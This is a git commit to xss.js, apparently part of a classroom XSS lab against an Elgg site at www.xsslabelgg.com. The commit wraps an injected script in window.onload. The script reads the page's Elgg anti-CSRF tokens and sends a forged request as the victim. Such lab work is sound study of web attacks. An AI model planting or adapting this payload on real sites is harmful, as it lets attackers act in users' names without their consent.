55fdc0cf66493a1375fd92ac89f03e8b6d5f202e
Hey Yo <heyyo@example.com>
2021-11-28 17:29:26 +0800

    xss2

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
-var Ajax=null;
+window.onload=function(){var Ajax=null;
 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
 var token="&__elgg_token="+elgg.security.token.__elgg_token; 
 
@@ -9,3 +9,4 @@ Ajax.open("GET",sendurl,true);
 Ajax.setRequestHeader("Host","www.xsslabelgg.com");
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); 
 Ajax.send(); 
+}
